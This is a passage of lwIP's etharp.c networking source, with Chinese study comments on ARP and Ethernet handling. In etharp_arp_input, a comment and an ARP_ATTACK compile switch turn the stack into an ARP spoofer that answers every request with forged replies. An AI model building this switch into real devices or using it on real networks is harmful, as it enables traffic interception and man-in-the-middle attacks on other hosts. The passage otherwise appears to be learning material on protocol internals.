    pbuf_free(p);
    return;
  }
  ETHARP_STATS_INC(etharp.recv);

#if LWIP_AUTOIP
  /* We have to check if a host already has configured our random
   * created link local address and continously check if there is
   * a host with this IP-address so we can detect collisions */
  autoip_arp_reply(netif, hdr);
#endif /* LWIP_AUTOIP */

  /* Copy struct ip_addr2 to aligned ip_addr, to support compilers without
   * structure packing (not using structure copy which breaks strict-aliasing rules). */
	/* 把ARP数据包中的源IP地址和目的IP地址复制到局部变量sipaddr和dipaddr中
	 * sipaddr和dipaddr是字对齐的
	 * ARP数据包中的ip地址不是字对齐的，不能直接使用
	 */
  SMEMCPY(&sipaddr, &hdr->sipaddr, sizeof(sipaddr));
  SMEMCPY(&dipaddr, &hdr->dipaddr, sizeof(dipaddr));

  /* this interface is not configured? */
	/* 如果本网络接口的ip地址未配置，则认为ARP包不是给本机的 */
  if (netif->ip_addr.addr == 0) {
    for_us = 0;
  } else {
		/* 判断ARP数据包的目的IP是不是本机，直接比较两个字(32bit) */
    /* ARP packet directed to us? */
    for_us = ip_addr_cmp(&dipaddr, &(netif->ip_addr));
  }

	/* ARP包的目的IP地址是本机，则更新ARP表，并允许插入一条新条目 */
  /* ARP message directed to us? */
  if (for_us) {
    /* add IP address in ARP cache; assume requester wants to talk to us.
     * can result in directly sending the queued packets for this host. */
    update_arp_entry(netif, &sipaddr, &(hdr->shwaddr), ETHARP_TRY_HARD);
  /* ARP message not directed to us? */
  }
	/* 如果ARP包的目的IP地址不是本机，则只更新ARP表中存在的条目，如果源IP地址
	 * 在ARP表中不存在，则不更新
	 */
	else {
    /* update the source IP address in the cache, if present */
    update_arp_entry(netif, &sipaddr, &(hdr->shwaddr), 0);
  }

	/* 判断是ARP请求还是ARP回复 */
  /* now act on the message itself */
  switch (htons(hdr->opcode)) {
  /* ARP request? */
	/* 是ARP请求 */
  case ARP_REQUEST:
    /* ARP request. If it asked for our address, we send out a
     * reply. In any case, we time-stamp any existing ARP entry,
     * and possiby send out an IP packet that was queued on it. */

    LWIP_DEBUGF (ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: incoming ARP request\n"));
    /* ARP request for our address? */
		/* ARP请求的目的IP地址是本机 */
		/* !!!!!!!!!!!!!!!!!!修改这里可以进行ARP攻击：!!!!!!!!!!!!!!!!!! 
		 * 1，不论ARP请求的目的IP地址是否是本机，都进行回复
		 * 2，ARP回复的源IP是ARP请求的目的IP，目的IP是ARP请求的源IP
		 * ARP回复的源MAC是本机MAC，目的MAC是ARP请求的源MAC
		 * 这样，发送ARP请求的主机会认为：它请求的IP的MAC地址是本机的MAC地址，所有发给
		 * 它请求的IP的数据包的目的MAC地址都会填写为本机MAC，进而把所有发向它请求的IP的数据包
		 * 都发给本机
		 * 3，另一种方法：直接构造ARP请求，ARP请求的目的IP主机会把ARP请求中的源IP-源MAC地址对应关系
		 * 更新到其ARP缓存。
		 */
#if ARP_ATTACK == 0
			if (for_us) {
#else
			if (1) {
#endif

      LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: replying to ARP request for our IP address\n"));
      /* Re-use pbuf to send ARP reply.
         Since we are re-using an existing pbuf, we can't call etharp_raw since
         that would allocate a new pbuf. */
			/* 在ARP请求包的pbuf上做修改，构造ARP回复 */
      hdr->opcode = htons(ARP_REPLY);

#if ARP_ATTACK == 1
			memcpy((void *)&ipaddr.addr, &hdr->dipaddr, 4);
#endif
			/* ARP包的目的IP */
      hdr->dipaddr = hdr->sipaddr;
			/* ARP包的源IP */
#if ARP_ATTACK == 0
      SMEMCPY(&hdr->sipaddr, &netif->ip_addr, sizeof(hdr->sipaddr));
#else
			SMEMCPY(&hdr->sipaddr, (void *)&ipaddr.addr, sizeof(hdr->sipaddr));
#endif

      LWIP_ASSERT("netif->hwaddr_len must be the same as ETHARP_HWADDR_LEN for etharp!",
                  (netif->hwaddr_len == ETHARP_HWADDR_LEN));
      i = ETHARP_HWADDR_LEN;
#if LWIP_AUTOIP
      /* If we are using Link-Local, ARP packets must be broadcast on the
       * link layer. (See RFC3927 Section 2.5) */
      ethdst_hwaddr = ((netif->autoip != NULL) && (netif->autoip->state != AUTOIP_STATE_OFF)) ? (u8_t*)(ethbroadcast.addr) : hdr->shwaddr.addr;
#endif /* LWIP_AUTOIP */

      while(i > 0) {
        i--;
				/* ARP包的目的MAC */
        hdr->dhwaddr.addr[i] = hdr->shwaddr.addr[i];
#if LWIP_AUTOIP
        ethhdr->dest.addr[i] = ethdst_hwaddr[i];
#else  /* LWIP_AUTOIP */
				/* 以太网帧的目的MAC */
        ethhdr->dest.addr[i] = hdr->shwaddr.addr[i];
#endif /* LWIP_AUTOIP */
				/* ARP包的源MAC，是传入函数的参数 */
        hdr->shwaddr.addr[i] = ethaddr->addr[i];
				/* 以太网帧的源MAC */
        ethhdr->src.addr[i] = ethaddr->addr[i];
      }

      /* hwtype, hwaddr_len, proto, protolen and the type in the ethernet header
         are already correct, we tested that before */
			/* 以太网帧中的其他值保持不变 */
			
			/* 把修改后的ARP数据包和携带它的以太网帧发送出去 */
      /* return ARP reply */
      netif->linkoutput(netif, p);
    /* we are not configured? */
    }
		/* ARP请求不是给本机的，且本机的IP还没有配置 */
		else if (netif->ip_addr.addr == 0) {
      /* { for_us == 0 and netif->ip_addr.addr == 0 } */
      LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: we are unconfigured, ARP request ignored.\n"));
    /* request was not directed to us */
    }
		/* ARP请求不是给本机的，且本机的IP已经配置 */
		else {
      /* { for_us == 0 and netif->ip_addr.addr != 0 } */
      LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: ARP request was not for us.\n"));
    }
    break;
	/* 是ARP回复，前面已经更新了ARP表，这里什么都不做 */
  case ARP_REPLY:
    /* ARP reply. We already updated the ARP cache earlier. */
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: incoming ARP reply\n"));
#if (LWIP_DHCP && DHCP_DOES_ARP_CHECK)
    /* DHCP wants to know about ARP replies from any host with an
     * IP address also offered to us by the DHCP server. We do not
     * want to take a duplicate IP address on a single network.
     * @todo How should we handle redundant (fail-over) interfaces? */
    dhcp_arp_reply(netif, &sipaddr);
#endif
    break;
  default:
	/* ARP数据包操作码错误 */
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: ARP unknown opcode type %"S16_F"\n", htons(hdr->opcode)));
    ETHARP_STATS_INC(etharp.err);
    break;
  }
	/* 释放底层向本函数提交的pbuf */
  /* free ARP packet */
  pbuf_free(p);
}

/**
 * Resolve and fill-in Ethernet address header for outgoing IP packet.
 *
 * For IP multicast and broadcast, corresponding Ethernet addresses
 * are selected and the packet is transmitted on the link.
 *
 * For unicast addresses, the packet is submitted to etharp_query(). In
 * case the IP address is outside the local network, the IP address of
 * the gateway is used.
 *
 * @param netif The lwIP network interface which the IP packet will be sent on.
 * @param q The pbuf(s) containing the IP packet to be sent.
 * @param ipaddr The IP address of the packet destination.
 *
 * @return
 * - ERR_RTE No route to destination (no gateway to external networks),
 * or the return type of either etharp_query() or etharp_send_ip().
 */
/* 发送一个数据包pbuf到目的IP地址ipaddr处，该函数被IP层调用
 * 根据IP层传下的ipaddr的类型，为IP数据包准备不同的目的MAC地址，并发送以太网帧
 */
err_t
etharp_output(struct netif *netif, struct pbuf *q, struct ip_addr *ipaddr)
{
  struct eth_addr *dest, mcastaddr;

  /* make room for Ethernet header - should not fail */
	/* 把pbuf的第一个节点的payload指针由IP头移动到以太网帧头 */
  if (pbuf_header(q, sizeof(struct eth_hdr)) != 0) {
    /* bail out */
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE | LWIP_DBG_LEVEL_SERIOUS,
      ("etharp_output: could not allocate room for header.\n"));
		/* 移动失败，则返回 */
    LINK_STATS_INC(link.lenerr);
    return ERR_BUF;
  }

  /* assume unresolved Ethernet address */
  dest = NULL;
	
	/* 根据目标IP地址，准备目的MAC地址
	 * 广播和多播IP地址特殊处理
	 * 单播IP地址通过ARP表获得目的MAC地址
	 */
  /* Determine on destination hardware address. Broadcasts and multicasts
   * are special, other IP addresses are looked up in the ARP table. */

  /* broadcast destination IP address? */
	/* 目标IP是网络接口对应子网的广播地址 */
  if (ip_addr_isbroadcast(ipaddr, netif)) {
    /* broadcast on Ethernet also */
		/* 目标MAC地址设为全1 */
    dest = (struct eth_addr *)&ethbroadcast;
  /* multicast destination IP address? */
  }
	/* 目标IP地址是多播地址，即D类地址 */
	else if (ip_addr_ismulticast(ipaddr)) {
    /* Hash IP multicast address to MAC address.*/
		/* 构造多播目的MAC地址 */
    mcastaddr.addr[0] = 0x01;
    mcastaddr.addr[1] = 0x00;
    mcastaddr.addr[2] = 0x5e;
    mcastaddr.addr[3] = ip4_addr2(ipaddr) & 0x7f;
    mcastaddr.addr[4] = ip4_addr3(ipaddr);
    mcastaddr.addr[5] = ip4_addr4(ipaddr);
    /* destination Ethernet address is multicast */
		/* 目标MAC地址指向构造的多播MAC地址 */
    dest = &mcastaddr;
  /* unicast destination IP address? */
  }
	/* 单播IP地址 */
	else {
    /* outside local network? */
		/* 目的IP和网络接口的IP不在同一个子网上 */
    if (!ip_addr_netcmp(ipaddr, &(netif->ip_addr), &(netif->netmask))) {
      /* interface has default gateway? */
			/* 配置了默认网关的IP */
      if (netif->gw.addr != 0) {
        /* send to hardware address of default gateway IP address */
				/* 根据网关的IP获得网关的MAC地址，并把IP包发送到网关的MAC地址处 */
        ipaddr = &(netif->gw);
      /* no default gateway available */
      }
			/* 没有配置默认网关，则返回错误 */
			else {
        /* no route to destination error (default gateway missing) */
        return ERR_RTE;
      }
    }
    /* queue on destination Ethernet address belonging to ipaddr */
		/* 对于单播包，根据下一跳的主机ipaddr查询其MAC地址并发送数据包 */
    return etharp_query(netif, ipaddr, q);
  }

  /* continuation for multicast/broadcast destinations */
  /* obtain source Ethernet address of the given interface */
  /* send packet directly on the link */
	/* 对于多播/广播包，目的MAC地址已经获得，不需要通过ARP层获取下一跳的MAC地址，直接发送 */
  return etharp_send_ip(netif, q, (struct eth_addr*)(netif->hwaddr), dest);
}

/**
 * Send an ARP request for the given IP address and/or queue a packet.
 *
 * If the IP address was not yet in the cache, a pending ARP cache entry
 * is added and an ARP request is sent for the given address. The packet
 * is queued on this entry.
 *
 * If the IP address was already pending in the cache, a new ARP request
 * is sent for the given address. The packet is queued on this entry.
 *
 * If the IP address was already stable in the cache, and a packet is
 * given, it is directly sent and no ARP request is sent out. 
 * 
 * If the IP address was already stable in the cache, and no packet is
 * given, an ARP request is sent out.
 * 
 * @param netif The lwIP network interface on which ipaddr
 * must be queried for.
 * @param ipaddr The IP address to be resolved.
 * @param q If non-NULL, a pbuf that must be delivered to the IP address.
 * q is not freed by this function.
 *
 * @note q must only be ONE packet, not a packet queue!
 *
 * @return
 * - ERR_BUF Could not make room for Ethernet header.
 * - ERR_MEM Hardware address unknown, and no more ARP entries available
 *   to query for address or queue the packet.
 * - ERR_MEM Could not queue packet due to memory shortage.
 * - ERR_RTE No route to destination (no gateway to external networks).
 * - ERR_ARG Non-unicast address given, those will not appear in ARP cache.
 *
 */
err_t
etharp_query(struct netif *netif, struct ip_addr *ipaddr, struct pbuf *q)
{
  struct eth_addr * srcaddr = (struct eth_addr *)netif->hwaddr;
  err_t result = ERR_MEM;
  s8_t i; /* ARP entry index */

  /* non-unicast address? */
  if (ip_addr_isbroadcast(ipaddr, netif) ||
      ip_addr_ismulticast(ipaddr) ||
      ip_addr_isany(ipaddr)) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: will not add non-unicast IP address to ARP cache\n"));
    return ERR_ARG;
  }

  /* find entry in ARP cache, ask to create entry if queueing packet */
#if LWIP_NETIF_HWADDRHINT
  i = find_entry(ipaddr, ETHARP_TRY_HARD, netif);
#else /* LWIP_NETIF_HWADDRHINT */
  i = find_entry(ipaddr, ETHARP_TRY_HARD);
#endif /* LWIP_NETIF_HWADDRHINT */

  /* could not find or create entry? */
  if (i < 0) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: could not create ARP entry\n"));
    if (q) {
      LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: packet dropped\n"));
      ETHARP_STATS_INC(etharp.memerr);
    }
    return (err_t)i;
  }

  /* mark a fresh entry as pending (we just sent a request) */
  if (arp_table[i].state == ETHARP_STATE_EMPTY) {
    arp_table[i].state = ETHARP_STATE_PENDING;
  }

  /* { i is either a STABLE or (new or existing) PENDING entry } */
  LWIP_ASSERT("arp_table[i].state == PENDING or STABLE",
  ((arp_table[i].state == ETHARP_STATE_PENDING) ||
   (arp_table[i].state == ETHARP_STATE_STABLE)));

  /* do we have a pending entry? or an implicit query request? */
  if ((arp_table[i].state == ETHARP_STATE_PENDING) || (q == NULL)) {
    /* try to resolve it; send out ARP request */
    result = etharp_request(netif, ipaddr);
    if (result != ERR_OK) {
      /* ARP request couldn't be sent */
      /* We don't re-send arp request in etharp_tmr, but we still queue packets,
         since this failure could be temporary, and the next packet calling
         etharp_query again could lead to sending the queued packets. */
    }
  }
  
  /* packet given? */
  if (q != NULL) {
    /* stable entry? */
    if (arp_table[i].state == ETHARP_STATE_STABLE) {
      /* we have a valid IP->Ethernet address mapping */
      /* send the packet */
      result = etharp_send_ip(netif, q, srcaddr, &(arp_table[i].ethaddr));
    /* pending entry? (either just created or already pending */
    } else if (arp_table[i].state == ETHARP_STATE_PENDING) {
#if ARP_QUEUEING /* queue the given q packet */
      struct pbuf *p;
      int copy_needed = 0;
      /* IF q includes a PBUF_REF, PBUF_POOL or PBUF_RAM, we have no choice but
       * to copy the whole queue into a new PBUF_RAM (see bug #11400) 
       * PBUF_ROMs can be left as they are, since ROM must not get changed. */
      p = q;
      while (p) {
        LWIP_ASSERT("no packet queues allowed!", (p->len != p->tot_len) || (p->next == 0));
        if(p->type != PBUF_ROM) {
          copy_needed = 1;
          break;
        }
        p = p->next;
      }
      if(copy_needed) {
        /* copy the whole packet into new pbufs */
        p = pbuf_alloc(PBUF_RAW, p->tot_len, PBUF_RAM);
        if(p != NULL) {
          if (pbuf_copy(p, q) != ERR_OK) {
            pbuf_free(p);
            p = NULL;
          }
        }
      } else {
        /* referencing the old pbuf is enough */
        p = q;
        pbuf_ref(p);
      }
      /* packet could be taken over? */
      if (p != NULL) {
        /* queue packet ... */
        struct etharp_q_entry *new_entry;
        /* allocate a new arp queue entry */
        new_entry = memp_malloc(MEMP_ARP_QUEUE);
        if (new_entry != NULL) {
          new_entry->next = 0;
          new_entry->p = p;
          if(arp_table[i].q != NULL) {
            /* queue was already existent, append the new entry to the end */
            struct etharp_q_entry *r;
            r = arp_table[i].q;
            while (r->next != NULL) {
              r = r->next;
            }
            r->next = new_entry;
          } else {
            /* queue did not exist, first item in queue */
            arp_table[i].q = new_entry;
          }
          LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: queued packet %p on ARP entry %"S16_F"\n", (void *)q, (s16_t)i));
          result = ERR_OK;
        } else {
          /* the pool MEMP_ARP_QUEUE is empty */
          pbuf_free(p);
          LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: could not queue a copy of PBUF_REF packet %p (out of memory)\n", (void *)q));
          /* { result == ERR_MEM } through initialization */
        }
      } else {
        ETHARP_STATS_INC(etharp.memerr);
        LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: could not queue a copy of PBUF_REF packet %p (out of memory)\n", (void *)q));
        /* { result == ERR_MEM } through initialization */
      }
#else /* ARP_QUEUEING == 0 */
      /* q && state == PENDING && ARP_QUEUEING == 0 => result = ERR_MEM */
      /* { result == ERR_MEM } through initialization */
      LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_query: Ethernet destination address unknown, queueing disabled, packet %p dropped\n", (void *)q));
#endif
    }
  }
  return result;
}

/**
 * Send a raw ARP packet (opcode and all addresses can be modified)
 *
 * @param netif the lwip network interface on which to send the ARP packet
 * @param ethsrc_addr the source MAC address for the ethernet header
 * @param ethdst_addr the destination MAC address for the ethernet header
 * @param hwsrc_addr the source MAC address for the ARP protocol header
 * @param ipsrc_addr the source IP address for the ARP protocol header
 * @param hwdst_addr the destination MAC address for the ARP protocol header
 * @param ipdst_addr the destination IP address for the ARP protocol header
 * @param opcode the type of the ARP packet
 * @return ERR_OK if the ARP packet has been sent
 *         ERR_MEM if the ARP packet couldn't be allocated
 *         any other err_t on failure
 */
/* 发送一个ARP包
 * netif是要使用的网络接口
 * ethsrc_addr是以太网帧中的源MAC地址
 * ethdst_addr是以太网帧中的目的MAC地址
 * hwsrc_addr是ARP数据包中的源MAC地址
 * ipsrc_addr是ARP数据包中的源IP地址
 * hwdst_addr是ARP数据包中的目的MAC地址
 * ipdst_addr是ARP数据包中的目的IP地址
 * opcode是ARP数据包中的操作码，1是ARP请求，2是ARP回复
 */
#if !LWIP_AUTOIP
static
#endif /* LWIP_AUTOIP */
err_t
etharp_raw(struct netif *netif, const struct eth_addr *ethsrc_addr,
           const struct eth_addr *ethdst_addr,
           const struct eth_addr *hwsrc_addr, const struct ip_addr *ipsrc_addr,
           const struct eth_addr *hwdst_addr, const struct ip_addr *ipdst_addr,
           const u16_t opcode)
{
  struct pbuf *p;
  err_t result = ERR_OK;
  u8_t k; /* ARP entry index */
	/* 以太网帧首部指针 */
  struct eth_hdr *ethhdr;
	/* ARP数据包指针 */
  struct etharp_hdr *hdr;
#if LWIP_AUTOIP
  const u8_t * ethdst_hwaddr;
#endif /* LWIP_AUTOIP */

  /* allocate a pbuf for the outgoing ARP request packet */
	/* 申请以太网帧+ARP数据包大小的内存，不足60字节
	 * 由网卡驱动netif->linkoutput()完成填充，实际是enc28j60自动填充
	 */
  p = pbuf_alloc(PBUF_RAW, SIZEOF_ETHARP_PACKET, PBUF_RAM);
  /* could allocate a pbuf for an ARP request? */
	/* 申请失败，则返回错误信息 */
  if (p == NULL) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE | LWIP_DBG_LEVEL_SERIOUS,
      ("etharp_raw: could not allocate pbuf for ARP request.\n"));
    ETHARP_STATS_INC(etharp.memerr);
    return ERR_MEM;
  }
  LWIP_ASSERT("check that first pbuf can hold struct etharp_hdr",
              (p->len >= SIZEOF_ETHARP_PACKET));

	/* 以太网帧首部指向pbuf的payload */
  ethhdr = p->payload;
	/* ARP数据包首部指针 */
  hdr = (struct etharp_hdr *)((u8_t*)ethhdr + SIZEOF_ETH_HDR);
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_raw: sending raw ARP packet.\n"));
	/* 填写ARP数据包的opcode，网络字节序 */
  hdr->opcode = htons(opcode);

  LWIP_ASSERT("netif->hwaddr_len must be the same as ETHARP_HWADDR_LEN for etharp!",
              (netif->hwaddr_len == ETHARP_HWADDR_LEN));
  k = ETHARP_HWADDR_LEN;
#if LWIP_AUTOIP
  /* If we are using Link-Local, ARP packets must be broadcast on the
   * link layer. (See RFC3927 Section 2.5) */
  ethdst_hwaddr = ((netif->autoip != NULL) && (netif->autoip->state != AUTOIP_STATE_OFF)) ? (u8_t*)(ethbroadcast.addr) : ethdst_addr->addr;
#endif /* LWIP_AUTOIP */
  /* Write MAC-Addresses (combined loop for both headers) */
	/* 填写ARP数据包的源MAC，目的MAC
	 * 填写以太网帧的源MAC，目的MAC
	 */
  while(k > 0) {
    k--;
    /* Write the ARP MAC-Addresses */
    hdr->shwaddr.addr[k] = hwsrc_addr->addr[k];
    hdr->dhwaddr.addr[k] = hwdst_addr->addr[k];
    /* Write the Ethernet MAC-Addresses */
#if LWIP_AUTOIP
    ethhdr->dest.addr[k] = ethdst_hwaddr[k];
#else  /* LWIP_AUTOIP */
    ethhdr->dest.addr[k] = ethdst_addr->addr[k];
#endif /* LWIP_AUTOIP */
    ethhdr->src.addr[k]  = ethsrc_addr->addr[k];
  }
	/* 填写ARP数据包的源IP，目的IP */
  hdr->sipaddr = *(struct ip_addr2 *)ipsrc_addr;
  hdr->dipaddr = *(struct ip_addr2 *)ipdst_addr;

	/* 填写ARP数据包的硬件类型 */
  hdr->hwtype = htons(HWTYPE_ETHERNET);
	/* 填写ARP数据包的协议类型 */
  hdr->proto = htons(ETHTYPE_IP);
  /* set hwlen and protolen together */
	/* 设置ARP数据包的硬件地址长度、协议地址长度 */
  hdr->_hwlen_protolen = htons((ETHARP_HWADDR_LEN << 8) | sizeof(struct ip_addr));

	/* 设置以太网帧的类型 */
  ethhdr->type = htons(ETHTYPE_ARP);
	
  /* send ARP query */
	/* 调用底层以太网帧发送函数，把pbuf通过netif发送出去 */
  result = netif->linkoutput(netif, p);
	/* 更新已发送数据包数 */
  ETHARP_STATS_INC(etharp.xmit);
  /* free ARP query packet */
	/* 发送完成，释放申请的pbuf */
  pbuf_free(p);
	/* pbuf指针指向NULL */
  p = NULL;
  /* could not allocate pbuf for ARP request */

  return result;
}

/**
 * Send an ARP request packet asking for ipaddr.
 *
 * @param netif the lwip network interface on which to send the request
 * @param ipaddr the IP address for which to ask
 * @return ERR_OK if the request has been sent
 *         ERR_MEM if the ARP packet couldn't be allocated
 *         any other err_t on failure
 */
/* 发送一个ARP请求包 */
err_t
etharp_request(struct netif *netif, struct ip_addr *ipaddr)
{
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_request: sending ARP request.\n"));
  return etharp_raw(netif, (struct eth_addr *)netif->hwaddr, &ethbroadcast,
                    (struct eth_addr *)netif->hwaddr, &netif->ip_addr, &ethzero,
                    ipaddr, ARP_REQUEST);
}

/**
 * Process received ethernet frames. Using this function instead of directly
 * calling ip_input and passing ARP frames through etharp in ethernetif_input,
 * the ARP cache is protected from concurrent access.
 *
 * @param p the recevied packet, p->payload pointing to the ethernet header
 * @param netif the network interface on which the packet was received
 */
/* ethernetif_input在接收到一帧数据时，调用该函数 */
err_t
ethernet_input(struct pbuf *p, struct netif *netif)
{
  struct eth_hdr* ethhdr;
  u16_t type;

  /* points to packet payload, which starts with an Ethernet header */
	/* 获取以太网帧头指针 */
  ethhdr = p->payload;
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE,
    ("ethernet_input: dest:%02x:%02x:%02x:%02x:%02x:%02x, src:%02x:%02x:%02x:%02x:%02x:%02x, type:%2hx\n",
     (unsigned)ethhdr->dest.addr[0], (unsigned)ethhdr->dest.addr[1], (unsigned)ethhdr->dest.addr[2],
     (unsigned)ethhdr->dest.addr[3], (unsigned)ethhdr->dest.addr[4], (unsigned)ethhdr->dest.addr[5],
     (unsigned)ethhdr->src.addr[0], (unsigned)ethhdr->src.addr[1], (unsigned)ethhdr->src.addr[2],
     (unsigned)ethhdr->src.addr[3], (unsigned)ethhdr->src.addr[4], (unsigned)ethhdr->src.addr[5],
     (unsigned)htons(ethhdr->type)));

	/* 获取以太网帧类型 */
  type = htons(ethhdr->type);
#if ETHARP_SUPPORT_VLAN
  if (type == ETHTYPE_VLAN) {
    struct eth_vlan_hdr *vlan = (struct eth_vlan_hdr*)(((char*)ethhdr) + SIZEOF_ETH_HDR);
#ifdef ETHARP_VLAN_CHECK /* if not, allow all VLANs */
    if (VLAN_ID(vlan) != ETHARP_VLAN_CHECK) {
      /* silently ignore this packet: not for our VLAN */
      pbuf_free(p);
      return ERR_OK;
    }
#endif /* ETHARP_VLAN_CHECK */
    type = htons(vlan->tpid);
  }
#endif /* ETHARP_SUPPORT_VLAN */

	/* 判断以太网帧类型 */
  switch (type) {
    /* IP packet? */
		/* 以太网帧中是IP数据包 */
    case ETHTYPE_IP:
		/* 如果允许使用IP数据包的以太网帧头和IP帧头更新ARP表
		 * 则更新ARP表
		 */
#if ETHARP_TRUST_IP_MAC
      /* update ARP table */
      etharp_ip_input(netif, p);
#endif /* ETHARP_TRUST_IP_MAC */
      /* skip Ethernet header */
			/* pbuf的payload指针向后移动，跳过以太网帧头 */
      if(pbuf_header(p, -(s16_t)SIZEOF_ETH_HDR)) {
        LWIP_ASSERT("Can't move over header in packet", 0);
				/* 若移动失败，则释放pbuf，丢弃数据包 */
        pbuf_free(p);
        p = NULL;
      } else {
				/* 去掉以太网帧头后，把剩下的IP数据包提交给IP层 */
        /* pass to IP layer */
        ip_input(p, netif);
      }
      break;
      
		/* 以太网帧中是ARP数据包 */
    case ETHTYPE_ARP:
      /* pass p to ARP module */
			/* 把以太网帧提交给ARP模块处理 */
      etharp_arp_input(netif, (struct eth_addr*)(netif->hwaddr), p);
      break;

#if PPPOE_SUPPORT
    case ETHTYPE_PPPOEDISC: /* PPP Over Ethernet Discovery Stage */
      pppoe_disc_input(netif, p);
      break;

    case ETHTYPE_PPPOE: /* PPP Over Ethernet Session Stage */
      pppoe_data_input(netif, p);
      break;
#endif /* PPPOE_SUPPORT */

		/* 帧类型错误 */
    default:
			/* 协议类型错误统计+1 */
      ETHARP_STATS_INC(etharp.proterr);
			/* 丢弃数据包数量+1 */
      ETHARP_STATS_INC(etharp.drop);
			/* 释放该pbuf */
      pbuf_free(p);
      p = NULL;
      break;
  }

  /* This means the pbuf is freed or consumed,
     so the caller doesn't have to free it again */
  return ERR_OK;
}
#endif /* LWIP_ARP */
